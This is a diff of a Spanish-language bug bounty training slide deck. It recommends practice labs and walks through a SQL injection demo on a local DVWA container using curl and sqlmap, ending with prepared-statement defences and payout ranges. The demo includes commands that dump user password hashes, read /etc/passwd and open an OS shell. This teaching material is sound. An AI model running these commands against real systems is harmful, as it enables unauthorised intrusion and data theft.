+                <p style="font-size:0.62em;color:var(--text-muted)">Entrenar antes de cazar. Práctica en entornos controlados.</p>
+                
+                <div class="card-grid three">
+                    <div class="card" style="border-top:3px solid var(--cyan)">
+                        <h4 style="color:var(--cyan)">🏠 DVWA</h4>
+                        <p style="font-size:0.55em">Damn Vulnerable Web App</p>
+                        <p style="font-size:0.5em;color:var(--text-muted)">PHP + MySQL</p>
+                        <p style="font-size:0.48em;color:var(--cyan);margin-top:0.2em">Ideal para: SQLi, XSS, LFI</p>
+                    </div>
+                    <div class="card" style="border-top:3px solid var(--green)">
+                        <h4 style="color:var(--green)">🛒 Juice Shop</h4>
+                        <p style="font-size:0.55em">OWASP Juice Shop</p>
+                        <p style="font-size:0.5em;color:var(--text-muted)">Node.js + Angular</p>
+                        <p style="font-size:0.48em;color:var(--green);margin-top:0.2em">Ideal para: OWASP Top 10</p>
+                    </div>
+                    <div class="card" style="border-top:3px solid var(--pink)">
+                        <h4 style="color:var(--pink)">🎓 TryHackMe</h4>
+                        <p style="font-size:0.55em">Rutas de aprendizaje</p>
+                        <p style="font-size:0.5em;color:var(--text-muted)">Rooms guiadas</p>
+                        <p style="font-size:0.48em;color:var(--pink);margin-top:0.2em">Ideal para: Principiantes</p>
+                    </div>
+                </div>
+
+                <div class="terminal" style="margin-top:0.4em;font-size:0.52em">
+                    <div class="line"><span class="comment"># 🐳 Levantar DVWA en 30 segundos</span></div>
+                    <div class="line"><span class="prompt">$</span> <span class="command">docker run -d -p 80:80 --name dvwa vulnerables/web-dvwa</span></div>
+                    <div class="line"><span class="output"># Abrir http://localhost → Login: admin/password</span></div>
+                    <div class="line">&nbsp;</div>
+                    <div class="line"><span class="comment"># 🛒 OWASP Juice Shop</span></div>
+                    <div class="line"><span class="prompt">$</span> <span class="command">docker run -d -p 3000:3000 bkimminich/juice-shop</span></div>
+                    <div class="line"><span class="output"># Abrir http://localhost:3000</span></div>
+                </div>
+
+                <div class="info-box" style="margin-top:0.3em">
+                    <h4>💡 Tip del Viajero</h4>
+                    <p style="font-size:0.58em">Practica en <strong>DVWA</strong> primero (nivel Low), luego pasa a <strong>Juice Shop</strong> para algo más realista. Después de eso, estás listo para <strong>TryHackMe</strong>.</p>
+                </div>
+            </section>
+
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <!-- SLIDE 7: EL CAMINO — Metodología 4 fases                           -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <section>
+                <div class="phase-indicator">
+                    <span class="num">PARADA 4</span>
+                    <span class="text">El Camino</span>
+                </div>
+                <h2>🛤️ Metodología Bug Bounty</h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">4 fases que todo hunter debe dominar.</p>
+                
+                <div style="display:flex;align-items:center;justify-content:center;gap:8px;margin:0.4em 0">
+                    <span style="background:var(--cyan);color:#000;padding:6px 14px;border-radius:6px;font-size:0.6em;font-weight:600">1. RECON</span>
+                    <span style="color:var(--gold);font-size:1.2em">→</span>
+                    <span style="background:var(--green);color:#000;padding:6px 14px;border-radius:6px;font-size:0.6em;font-weight:600">2. ENUM</span>
+                    <span style="color:var(--gold);font-size:1.2em">→</span>
+                    <span style="background:var(--pink);color:#000;padding:6px 14px;border-radius:6px;font-size:0.6em;font-weight:600">3. EXPLOIT</span>
+                    <span style="color:var(--gold);font-size:1.2em">→</span>
+                    <span style="background:var(--orange);color:#000;padding:6px 14px;border-radius:6px;font-size:0.6em;font-weight:600">4. REPORT</span>
+                </div>
+
+                <div class="card-grid four">
+                    <div class="card" style="border-top:3px solid var(--cyan)">
+                        <h4 style="color:var(--cyan)">1. RECON</h4>
+                        <p style="font-size:0.52em">Reconocimiento</p>
+                        <p style="font-size:0.48em;color:var(--text-muted)">subfinder, amass, nmap</p>
+                        <p style="font-size:0.48em;color:var(--cyan)">⏱️ 70% del tiempo</p>
+                    </div>
+                    <div class="card" style="border-top:3px solid var(--green)">
+                        <h4 style="color:var(--green)">2. ENUMERACIÓN</h4>
+                        <p style="font-size:0.52em">Mapeo completo</p>
+                        <p style="font-size:0.48em;color:var(--text-muted)">Burp, ffuf, nuclei</p>
+                        <p style="font-size:0.48em;color:var(--green)">🎯 Nunca saltar</p>
+                    </div>
+                    <div class="card" style="border-top:3px solid var(--pink)">
+                        <h4 style="color:var(--pink)">3. EXPLOTACIÓN</h4>
+                        <p style="font-size:0.52em">Validar bugs</p>
+                        <p style="font-size:0.48em;color:var(--text-muted)">SQLi, XSS, SSRF</p>
+                        <p style="font-size:0.48em;color:var(--pink)">✨ La gloria</p>
+                    </div>
+                    <div class="card" style="border-top:3px solid var(--orange)">
+                        <h4 style="color:var(--orange)">4. REPORTE</h4>
+                        <p style="font-size:0.52em">Documentar</p>
+                        <p style="font-size:0.48em;color:var(--text-muted)">PoC + CVSS</p>
+                        <p style="font-size:0.48em;color:var(--orange)">💰 Cobrar</p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <!-- SLIDE 8-13: DEMO SQLi — 6 vertical slides                          -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <section>
+                <div class="phase-indicator">
+                    <span class="num">PARADA 5</span>
+                    <span class="text">Demostración en Vivo</span>
+                </div>
+                <h2>⚔️ SQL Injection — De 0 a Exploit</h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Demostración completa con DVWA local. Solo laboratorio.</p>
+                
+                <div style="display:flex;flex-direction:column;gap:10px;margin-top:0.3em">
+                    <div class="journey-step">
+                        <span class="journey-icon">🔧</span>
+                        <div class="journey-content">
+                            <h4>Paso 0: Setup</h4>
+                            <p>Levantar DVWA con Docker y autenticarse</p>
+                        </div>
+                    </div>
+                    <div style="color:var(--gold);text-align:center">↓</div>
+                    <div class="journey-step">
+                        <span class="journey-icon">🔍</span>
+                        <div class="journey-content">
+                            <h4>Paso 1: Detección</h4>
+                            <p>Identificar SQLi con comilla simple</p>
+                        </div>
+                    </div>
+                    <div style="color:var(--gold);text-align:center">↓</div>
+                    <div class="journey-step">
+                        <span class="journey-icon">🗺️</span>
+                        <div class="journey-content">
+                            <h4>Paso 2: Enumeración</h4>
+                            <p>Mapear BD con sqlmap (--dbs, --tables)</p>
+                        </div>
+                    </div>
+                    <div style="color:var(--gold);text-align:center">↓</div>
+                    <div class="journey-step">
+                        <span class="journey-icon">💎</span>
+                        <div class="journey-content">
+                            <h4>Paso 3: Extracción</h4>
+                            <p>Dump de usuarios y hashes MD5</p>
+                        </div>
+                    </div>
+                    <div style="color:var(--gold);text-align:center">↓</div>
+                    <div class="journey-step">
+                        <span class="journey-icon">💥</span>
+                        <div class="journey-content">
+                            <h4>Paso 4: Impacto</h4>
+                            <p>RCE, lectura archivos, post-explotación</p>
+                        </div>
+                    </div>
+                    <div style="color:var(--gold);text-align:center">↓</div>
+                    <div class="journey-step">
+                        <span class="journey-icon">🛡️</span>
+                        <div class="journey-content">
+                            <h4>Paso 5: Prevención</h4>
+                            <p>Prepared Statements y defensas</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="info-box pink" style="margin-top:0.4em">
+                    <h4>⚠️ Nota Legal</h4>
+                    <p style="font-size:0.58em">Todos los comandos son para <strong>DVWA local</strong>. Hacer esto en producción sin autorización = <strong>CRIMEN</strong>.</p>
+                </div>
+            </section>
+
+            <!-- SLIDE 9: DEMO — Setup -->
+            <section>
+                <h2>🔧 SQLi — Paso 0: Setup</h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Levantar DVWA y autenticarse (lab local).</p>
+                
+                <div class="terminal" style="font-size:0.52em">
+                    <div class="line"><span class="comment"># 1. Levantar DVWA</span></div>
+                    <div class="line"><span class="prompt">$</span> <span class="command">docker run -d -p 80:80 --name dvwa vulnerables/web-dvwa</span></div>
+                    <div class="line"><span class="output"># Esperar 30 segundos (MySQL inicia)</span></div>
+                    <div class="line">&nbsp;</div>
+                    <div class="line"><span class="comment"># 2. Obtener token CSRF y loguearse</span></div>
+                    <div class="line"><span class="prompt">$</span> <span class="command">TOKEN=$(curl -s http://localhost/login.php | grep -oP "user_token.*value='\K[^']+")</span></div>
+                    <div class="line"><span class="prompt">$</span> <span class="command">curl -c cookies.txt -d "username=admin&password=password&Login=Login&user_token=$TOKEN" http://localhost/login.php</span></div>
+                    <div class="line">&nbsp;</div>
+                    <div class="line"><span class="comment"># 3. Verificar</span></div>
+                    <div class="line"><span class="prompt">$</span> <span class="command">curl -b cookies.txt http://localhost/ | grep "Security Level"</span></div>
+                    <div class="line"><span class="highlight">Security Level: low ✓</span></div>
+                </div>
+            </section>
+
+            <!-- SLIDE 10: DEMO — Detección -->
+            <section>
+                <h2>🔍 SQLi — Paso 1: Detección</h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Identificar la vulnerabilidad con comilla simple.</p>
+                
+                <div class="terminal" style="font-size:0.52em">
+                    <div class="line"><span class="comment"># Request normal</span></div>
+                    <div class="line"><span class="prompt">$</span> <span class="command">curl -b cookies.txt "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" | grep "First name"</span></div>
+                    <div class="line"><span class="output">First name: admin</span></div>
+                    <div class="line">&nbsp;</div>
+                    <div class="line"><span class="comment"># Request con comilla → ERROR = SQLi ✓</span></div>
+                    <div class="line"><span class="prompt">$</span> <span class="command">curl -b cookies.txt "http://localhost/vulnerabilities/sqli/?id=1'&Submit=Submit"</span></div>
+                    <div class="line"><span class="output" style="color:var(--pink)">You have an error in your SQL syntax</span></div>
+                </div>
+
+                <div class="info-box" style="margin-top:0.3em">
+                    <h4>💡 ¿Por qué funciona?</h4>
+                    <p style="font-size:0.58em">El servidor interpreta: <code style="font-size:0.9em">SELECT * FROM users WHERE id='1''</code></p>
+                    <p style="font-size:0.55em">La comilla extra rompe la query → <span style="color:var(--pink)">ERROR CONFIRMADO</span></p>
+                </div>
+            </section>
+
+            <!-- SLIDE 11: DEMO — Enumeración -->
+            <section>
+                <h2>🗺️ SQLi — Paso 2: Enumeración</h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Usar sqlmap para mapear la base de datos.</p>
+                
+                <div class="terminal" style="font-size:0.48em">
+                    <div class="line"><span class="comment"># Obtener sesión para sqlmap</span></div>
+                    <div class="line"><span class="prompt">$</span> <span class="command">SESSID=$(grep PHPSESSID cookies.txt | awk '{print $NF}')</span></div>
+                    <div class="line">&nbsp;</div>
+                    <div class="line"><span class="comment"># 1. Listar bases de datos</span></div>
+                    <div class="line"><span class="prompt">$</span> <span class="command">sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \</span></div>
+                    <div class="line"><span class="command">&nbsp;&nbsp;--cookie="PHPSESSID=$SESSID; security=low" --batch --dbs</span></div>
+                    <div class="line"><span class="highlight">available databases [2]: [*] dvwa [*] information_schema</span></div>
+                    <div class="line">&nbsp;</div>
+                    <div class="line"><span class="comment"># 2. Listar tablas de dvwa</span></div>
+                    <div class="line"><span class="prompt">$</span> <span class="command">sqlmap -u "..." --batch -D dvwa --tables</span></div>
+                    <div class="line"><span class="output">[2 tables] | guestbook | users |</span></div>
+                </div>
+            </section>
+
+            <!-- SLIDE 12: DEMO — Extracción -->
+            <section>
+                <h2>💎 SQLi — Paso 3: Extracción</h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Extraer datos sensibles (lab local DVWA).</p>
+                
+                <div class="terminal" style="font-size:0.45em">
+                    <div class="line"><span class="comment"># Dump completo de usuarios (LAB LOCAL)</span></div>
+                    <div class="line"><span class="prompt">$</span> <span class="command">sqlmap -u "..." --batch --dump -D dvwa -T users</span></div>
+                    <div class="line">&nbsp;</div>
+                    <div class="line"><span style="color:var(--gold)">+----+--------+------------+----------------------------------+</span></div>
+                    <div class="line"><span style="color:var(--gold)">| id | user   | first_name | password (MD5)                    |</span></div>
+                    <div class="line"><span style="color:var(--gold)">+----+--------+------------+----------------------------------+</span></div>
+                    <div class="line"><span class="output">| 1  | admin  | admin      | 5f4dcc3b5aa765d61d8327deb882cf99 |</span></div>
+                    <div class="line"><span class="output">| 2  | gordon | Gordon     | e99a18c428cb38d5f260853678922e03 |</span></div>
+                    <div class="line"><span class="output">| 3  | 1337   | Hack       | 8d3533d75ae2c3966d7e0d4fcc69216b |</span></div>
+                    <div class="line"><span style="color:var(--gold)">+----+--------+------------+----------------------------------+</span></div>
+                </div>
+
+                <div class="info-box pink" style="margin-top:0.3em">
+                    <h4>🔓 Hashes crackeados</h4>
+                    <p style="font-size:0.52em"><code>5f4dcc3b...</code> → <code>password</code> | <code>e99a18c4...</code> → <code>123456</code> | <code>8d3533d7...</code> → <code>charlie</code></p>
+                </div>
+            </section>
+
+            <!-- SLIDE 13: DEMO — Impacto -->
+            <section>
+                <h2>💥 SQLi — Paso 4: Impacto</h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">De SQLi a compromiso total.</p>
+                
+                <div class="card-grid two">
+                    <div class="card" style="border-left:3px solid var(--pink)">
+                        <h4 style="color:var(--pink)">📁 Lectura de Archivos</h4>
+                        <div class="terminal" style="font-size:0.42em">
+                            <div class="line"><span class="command">sqlmap -r req.txt --file-read="/etc/passwd"</span></div>
+                            <div class="line"><span class="output">root:x:0:0:root:/root:/bin/bash</span></div>
+                        </div>
+                    </div>
+                    <div class="card" style="border-left:3px solid var(--orange)">
+                        <h4 style="color:var(--orange)">🐚 RCE (Shell)</h4>
+                        <div class="terminal" style="font-size:0.42em">
+                            <div class="line"><span class="command">sqlmap -r req.txt --os-shell</span></div>
+                            <div class="line"><span class="output">os-shell> id → uid=33(www-data)</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="info-box" style="margin-top:0.3em">
+                    <h4>💰 En Bug Bounty real</h4>
+                    <p style="font-size:0.58em"><strong>CVSS 9.8 CRITICAL</strong> → Bounty: <span style="color:var(--gold)">$2,000 - $50,000</span></p>
+                    <p style="font-size:0.52em">Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N</p>
+                </div>
+            </section>
+
+            <!-- SLIDE 14: DEMO — Prevención -->
+            <section>
+                <h2>🛡️ SQLi — Prevención</h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Cómo defenderse contra SQL Injection.</p>
+                
+                <div class="columns">
+                    <div class="info-box pink">
+                        <h4>❌ VULNERABLE (PHP)</h4>
+                        <pre style="font-size:0.45em"><code>$id = $_GET['id'];
+$query = "SELECT * FROM users 
+           WHERE id = '$id'";
+$result = mysqli_query($conn, $query);</code></pre>
+                        <p style="font-size:0.5em;color:var(--pink)">Input concat directo en query</p>
+                    </div>
+                    <div class="info-box green">
+                        <h4>✅ SEGURO (PHP)</h4>
+                        <pre style="font-size:0.45em"><code>// Prepared Statements (PDO)
+$stmt = $pdo->prepare(
+  "SELECT * FROM users WHERE id = ?"
+);
+$stmt->execute([$_GET['id']]);
+$result = $stmt->fetch();</code></pre>
+                        <p style="font-size:0.5em;color:var(--green)">Parámetros separados</p>
+                    </div>
+                </div>
+
+                <div class="card-grid four" style="margin-top:0.3em">
+                    <div class="card"><h4 style="color:var(--cyan)">1. Prepared Stmt</h4><p style="font-size:0.5em">SIEMPRE</p></div>
+                    <div class="card"><h4 style="color:var(--green)">2. Least Privilege</h4><p style="font-size:0.5em">DB sin admin</p></div>
+                    <div class="card"><h4 style="color:var(--orange)">3. Input Valid.</h4><p style="font-size:0.5em">Whitelist</p></div>
+                    <div class="card"><h4 style="color:var(--pink)">4. WAF</h4><p style="font-size:0.5em">Cloudflare, ModSecurity</p></div>
+                </div>
+            </section>
+
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <!-- SLIDE 15: EL BOTÍN — Pagos y Roadmap                               -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <section>
+                <div class="phase-indicator">
+                    <span class="num">PARADA 6</span>
+                    <span class="text">El Botín</span>
+                </div>
+                <h2>💰 Rangos de Recompensa (CVSS)</h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Bug Bounty payment ranges by severity.</p>
+                
+                <div class="card-grid four">
+                    <div class="card" style="border-top:3px solid var(--cyan)">
+                        <h4 style="color:var(--cyan)">🔵 LOW</h4>
+                        <p style="font-size:0.7em;font-weight:600;color:var(--cyan)">CVSS 0.1 - 3.9</p>
+                        <p style="font-size:0.55em;color:var(--text-muted)">$100 - $500</p>
+                        <p style="font-size:0.48em">Info leaks, version disclosure</p>
+                    </div>
+                    <div class="card" style="border-top:3px solid var(--orange)">
+                        <h4 style="color:var(--orange)">🟡 MEDIUM</h4>
+                        <p style="font-size:0.7em;font-weight:600;color:var(--orange)">CVSS 4.0 - 6.9</p>
+                        <p style="font-size:0.55em;color:var(--text-muted)">$500 - $2,000</p>
+                        <p style="font-size:0.48em">CSRF, SSRF limited, XSS stored</p>
+                    </div>
+                    <div class="card" style="border-top:3px solid var(--pink)">
+                        <h4 style="color:var(--pink)">🟠 HIGH</h4>
+                        <p style="font-size:0.7em;font-weight:600;color:var(--pink)">CVSS 7.0 - 8.9</p>
+                        <p style="font-size:0.55em;color:var(--text-muted)">$2,000 - $10,000</p>
+                        <p style="font-size:0.48em">SQLi, auth bypass, IDOR critical</p>
+                    </div>
+                    <div class="card" style="border-top:3px solid var(--gold)">
+                        <h4 style="color:var(--gold)">🔴 CRITICAL</h4>
+                        <p style="font-size:0.7em;font-weight:600;color:var(--gold)">CVSS 9.0 - 10.0</p>
+                        <p style="font-size:0.55em;color:var(--text-muted)">$10,000 - $65,000</p>
+                        <p style="font-size:0.48em">RCE, SQLi mass data, full takeover</p>
+                    </div>
+                </div>
+
+                <div class="info-box green" style="margin-top:0.4em">
+                    <h4>📊 Roadmap Recomendado</h4>
+                    <p style="font-size:0.58em"><strong>Sem 1-2:</strong> Labs (DVWA, Juice Shop) → <strong>Sem 3-4:</strong> Herramientas (Burp, Nuclei) → <strong>Sem 5-8:</strong> VDPs (Bugcrowd) → <strong>Sem 9-12:</strong> Programas reales (Intigriti, H1)</p>
+                </div>
+            </section>
+
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <!-- SLIDE 16: PLATAFORMAS                                              -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <section>
+                <h2>🗺️ Mapas Aliados — Plataformas</h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Dónde encontrar programas y cobrar bounties.</p>
                 
                 <table class="comparison-table">
                     <thead>
                         <tr>
                             <th>Plataforma</th>
                             <th>Alcance</th>
-                            <th>Payout Promedio</th>
-                            <th>Tiempo Respuesta</th>
+                            <th>Payout Avg</th>
+                            <th>Respuesta</th>
                             <th>Diferenciador</th>
                         </tr>
                     </thead>
@@ -259,561 +756,167 @@
                         <tr>
                             <td style="color:var(--pink)">HackerOne</td>
                             <td>Enterprise, Fortune 500</td>
-                            <td>$5,000-$50,000+</td>
+                            <td>$5K-$50K+</td>
                             <td>7-14 días</td>
-                            <td>Mayor volumen Fortune 500</td>
+                            <td>Mayor volumen</td>
                         </tr>
                         <tr>
                             <td style="color:var(--orange)">Bugcrowd</td>
                             <td>Startups a Enterprise</td>
-                            <td>$500-$10,000</td>
+                            <td>$500-$10K</td>
                             <td>5-10 días</td>
-                            <td>VDPs y startups early-stage</td>
+                            <td>VDPs, buen inicio</td>
                         </tr>
                         <tr>
                             <td style="color:var(--green)">Intigriti</td>
                             <td>Europa, APAC</td>
-                            <td>$1,000-$15,000</td>
+                            <td>$1K-$15K</td>
                             <td>3-7 días</td>
-                            <td>Mejor respuesta, europeos</td>
+                            <td>Mejor respuesta</td>
                         </tr>
                         <tr>
                             <td style="color:var(--cyan)">YesWeHack</td>
                             <td>Francia, Global</td>
-                            <td>$500-$5,000</td>
+                            <td>$500-$5K</td>
                             <td>5-10 días</td>
-                            <td>Enfoque francés, GDPR</td>
-                        </tr>
-                        <tr>
-                            <td style="color:var(--silver)">Standoff</td>
-                            <td>Rusia, Global</td>
-                            <td>$650-$2,600</td>
-                            <td>Variable</td>
-                            <td>Crecimiento 2.2x YoY</td>
+                            <td>GDPR, EU focus</td>
                         </tr>
                     </tbody>
                 </table>
 
-                <div class="info-box green" style="margin-top:0.3em">
-                    <h4>🎯 Recomendación Estratégica</h4>
-                    <p style="font-size:0.62em"><strong>1.</strong> Comenzar en <strong style="color:var(--orange)">Bugcrowd VDP</strong> (programas de prueba) → <strong>2.</strong> Intigriti (mejor respuesta) → <strong>3.</strong> HackerOne (programas enterprise)</p>
-                </div>
-            </section>
-
-            <!-- SLIDE 6: LABS -->
-            <section>
-                <h2>Campos de Entrenamiento</h2>
-                <p style="font-size:0.62em;color:var(--text-muted)">Practicar en entornos controlados antes de tocar sistemas reales.</p>
-                
-                <div class="card-grid three">
-                    <div class="card" style="border-color:var(--green)">
-                        <h4 style="color:var(--green)">🎯 HackTheBox</h4>
-                        <p>CTFs, Machines, Pro Labs</p>
-                        <p style="color:var(--green);font-size:0.48em">Nivel: Avanzado</p>
-                        <p style="font-size:0.52em;margin-top:0.2em">Ofrece:</p>
-                        <p style="font-size:0.48em">• 400+ máquinas</p>
-                        <p style="font-size:0.48em">• Battlegrounds (PvP)</p>
-                        <p style="font-size:0.48em">• Certificaciones OSCP-like</p>
-                    </div>
-                    <div class="card" style="border-color:var(--cyan)">
-                        <h4 style="color:var(--cyan)">🏠 TryHackMe</h4>
-                        <p>Learning Paths, Rooms</p>
-                        <p style="color:var(--cyan);font-size:0.48em">Nivel: Principiante</p>
-                        <p style="font-size:0.52em;margin-top:0.2em">Ofrece:</p>
-                        <p style="font-size:0.48em">• Rutas de aprendizaje</p>
-                        <p style="font-size:0.48em">• Rooms guiadas paso a paso</p>
-                        <p style="font-size:0.48em">• CTFs temáticos</p>
-                    </div>
-                    <div class="card" style="border-color:var(--pink)">
-                        <h4 style="color:var(--pink)">🐳 Docker Local</h4>
-                        <p>DVWA, Juice Shop, WebGoat</p>
-                        <p style="color:var(--pink);font-size:0.48em">Nivel: Variable</p>
-                        <p style="font-size:0.52em;margin-top:0.2em">Ofrece:</p>
-                        <p style="font-size:0.48em">• Total control</p>
-                        <p style="font-size:0.48em">• Sin costo</p>
-                        <p style="font-size:0.48em">• OWASP Top 10 labs</p>
-                    </div>
-                </div>
-
-                <div class="terminal" style="margin-top:0.3em;font-size:0.52em">
-                    <div class="line"><span class="comment"># DVWA - Damn Vulnerable Web App</span></div>
-                    <div class="line"><span class="prompt">$</span> <span class="command">docker run -d -p 80:80 --name dvwa vulnerables/web-dvwa</span></div>
-                    <div class="line"><span class="comment"># OWASP Juice Shop - JavaScript</span></div>
-                    <div class="line"><span class="prompt">$</span> <span class="command">docker run -d -p 3000:3000 --name juice bkimminich/juice-shop</span></div>
-                    <div class="line"><span class="comment"># WebGoat - Java</span></div>
-                    <div class="line"><span class="prompt">$</span> <span class="command">docker run -d -p 8080:8080 --name webgoat webgoat/webgoat</span></div>
-                </div>
-            </section>
-
-            <!-- SLIDE 7: METODOLOGÍA -->
-            <section>
-                <h2>Metodología de Bug Bounty</h2>
-                <p style="font-size:0.62em;color:var(--text-muted)">Framework estructurado: 4 fases con herramientas específicas.</p>
-                
-                <div class="card-grid four">
-                    <div class="card" style="border-color:var(--cyan)">
-                        <h4 style="color:var(--cyan)">1. RECON</h4>
-                        <p style="font-size:0.55em">Reconocimiento pasivo y activo</p>
-                        <div style="margin-top:0.2em">
-                            <p style="font-size:0.48em;color:var(--cyan)">Herramientas:</p>
-                            <p style="font-size:0.48em">• subfinder, amass</p>
-                            <p style="font-size:0.48em">• assetfinder, chaos</p>
-                            <p style="font-size:0.48em">• nmap, naabu</p>
-                            <p style="font-size:0.48em">• httpx, gau</p>
-                        </div>
-                        <p style="color:var(--cyan);font-size:0.48em;margin-top:0.15em">70% del trabajo</p>
-                    </div>
-                    <div class="card" style="border-color:var(--green)">
-                        <h4 style="color:var(--green)">2. ENUMERACIÓN</h4>
-                        <p style="font-size:0.55em">Mapeo completo del objetivo</p>
-                        <div style="margin-top:0.2em">
-                            <p style="font-size:0.48em;color:var(--green)">Herramientas:</p>
-                            <p style="font-size:0.48em">• Burp Suite Pro</p>
-                            <p style="font-size:0.48em">• ffuf, dirb</p>
-                            <p style="font-size:0.48em">• param Miner</p>
-                            <p style="font-size:0.48em">• nuclei (templates)</p>
-                        </div>
-                        <p style="color:var(--green);font-size:0.48em;margin-top:0.15em">Nunca saltarse esta fase</p>
-                    </div>
-                    <div class="card" style="border-color:var(--pink)">
-                        <h4 style="color:var(--pink)">3. EXPLOTACIÓN</h4>
-                        <p style="font-size:0.55em">Validación de vulnerabilidades</p>
-                        <div style="margin-top:0.2em">
-                            <p style="font-size:0.48em;color:var(--pink)">Vulnerabilidades:</p>
-                            <p style="font-size:0.48em">• SQLi, XSS, SSRF</p>
-                            <p style="font-size:0.48em">• IDOR, LFI/RFI</p>
-                            <p style="font-size:0.48em">• Auth bypass</p>
-                            <p style="font-size:0.48em">• RCE, XXE</p>
-                        </div>
-                        <p style="color:var(--pink);font-size:0.48em;margin-top:0.15em">La gloria</p>
-                    </div>
-                    <div class="card" style="border-color:var(--orange)">
-                        <h4 style="color:var(--orange)">4. REPORTE</h4>
-                        <p style="font-size:0.55em">Documentación profesional</p>
-                        <div style="margin-top:0.2em">
-                            <p style="font-size:0.48em;color:var(--orange)">Elementos:</p>
-                            <p style="font-size:0.48em">• PoC reproducible</p>
-                            <p style="font-size:0.48em">• CVSS 3.1 score</p>
-                            <p style="font-size:0.48em">• Impacto de negocio</p>
-                            <p style="font-size:0.48em">• Remediación sugerida</p>
-                        </div>
-                        <p style="color:var(--orange);font-size:0.48em;margin-top:0.15em">Cobrar el bounty</p>
-                    </div>
-                </div>
-            </section>
-
-            <!-- SLIDE 8: LIVE DEMO - SETUP -->
-            <section>
-                <h2>Demo SQLi — Paso 0: Setup</h2>
-                <p style="font-size:0.62em;color:var(--text-muted)">Levantar laboratorio DVWA con Docker. Solo entorno local.</p>
-                
-                <div class="terminal" style="font-size:0.52em">
-                    <div class="line"><span class="comment"># 1. Levantar DVWA</span></div>
-                    <div class="line"><span class="prompt">$</span> <span class="command">docker run -d -p 80:80 --name dvwa vulnerables/web-dvwa</span></div>
-                    <div class="line"><span class="comment"># Esperar ~30 segundos a que inicie MySQL</span></div>
-                    <div class="line">&nbsp;</div>
-                    <div class="line"><span class="comment"># 2. Login (obtener token CSRF)</span></div>
-                    <div class="line"><span class="prompt">$</span> <span class="command">TOKEN=$(curl -s http://localhost/login.php | grep -oP "user_token.*value='\K[^']+")</span></div>
-                    <div class="line"><span class="prompt">$</span> <span class="command">curl -c cookies.txt -d "username=admin&password=password&Login=Login&user_token=$TOKEN" http://localhost/login.php</span></div>
-                    <div class="line">&nbsp;</div>
-                    <div class="line"><span class="comment"># 3. Verificar login</span></div>
-                    <div class="line"><span class="prompt">$</span> <span class="command">curl -b cookies.txt http://localhost/ | grep "Security Level"</span></div>
-                    <div class="line"><span class="output" style="color:var(--green)">Security Level: low</span></div>
-                </div>
-
-                <div class="info-box" style="margin-top:0.2em">
-                    <h4>⚠️ Nota Importante</h4>
-                    <p style="font-size:0.58em">La primera vez, DVWA crea la BD automáticamente. Si falla, abrir <code>http://localhost/setup.php</code> en navegador y click "Create/Reset Database".</p>
-                </div>
-
-                <div class="info-box orange" style="margin-top:0.2em">
-                    <h4>🔧 Troubleshooting</h4>
-                    <p style="font-size:0.52em"><strong>1.</strong> "Unable to find image" → Normal, esperar descarga (~1-2 min)</p>
-                    <p style="font-size:0.52em"><strong>2.</strong> "Port 80 in use" → <code>docker rm -f dvwa</code> y repetir</p>
-                    <p style="font-size:0.52em"><strong>3.</strong> "Connection refused" → Esperar 30s, MySQL inicia después</p>
-                </div>
-            </section>
-
-            <!-- SLIDE 9: LIVE DEMO - DETECCIÓN -->
-            <section>
-                <h2>Demo SQLi — Paso 1: Detección</h2>
-                <p style="font-size:0.62em;color:var(--text-muted)">Identificar la vulnerabilidad con comillas simples.</p>
-                
-                <div class="terminal" style="font-size:0.52em">
-                    <div class="line"><span class="comment"># Request normal (con cookies de sesión)</span></div>
-                    <div class="line"><span class="prompt">$</span> <span class="command">curl -b cookies.txt "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" | grep -E "ID:|First name"</span></div>
-                    <div class="line"><span class="output">ID: 1</span></div>
-                    <div class="line"><span class="output">First name: admin</span></div>
-                    <div class="line"><span class="output">Surname: admin</span></div>
-                    <div class="line">&nbsp;</div>
-                    <div class="line"><span class="comment"># Request con comilla simple — ERROR = SQLi</span></div>
-                    <div class="line"><span class="prompt">$</span> <span class="command">curl -b cookies.txt "http://localhost/vulnerabilities/sqli/?id=1'&Submit=Submit"</span></div>
-                    <div class="line"><span class="output" style="color:var(--pink)">You have an error in your SQL syntax</span></div>
-                    <div class="line"><span class="output" style="color:var(--pink)">near ''1''' at line 1</span></div>
-                </div>
-
-                <div class="info-box pink" style="margin-top:0.3em">
-                    <h4>🔍 Análisis — El servidor interpreta:</h4>
-                    <p style="font-size:0.55em;font-family:var(--mono);color:var(--pink)">SELECT * FROM users WHERE id='1''</p>
-                    <p style="font-size:0.55em;margin-top:0.1em">La comilla extra rompe la query → ERROR</p>
-                </div>
-
-                <div class="info-box green" style="margin-top:0.2em">
-                    <h4>✓ SQLi CONFIRMADO</h4>
-                    <p style="font-size:0.58em">Error "SQL syntax" = input se inyecta directamente en query SQL sin sanitización.</p>
-                </div>
-            </section>
-
-            <!-- SLIDE 10: LIVE DEMO - ENUMERACIÓN -->
-            <section>
-                <h2>Demo SQLi — Paso 2: Enumeración</h2>
-                <p style="font-size:0.62em;color:var(--text-muted)">Usar sqlmap para mapear la base de datos.</p>
-                
-                <div class="terminal" style="font-size:0.48em">
-                    <div class="line"><span class="comment"># 1. Extraer token de sesión para sqlmap</span></div>
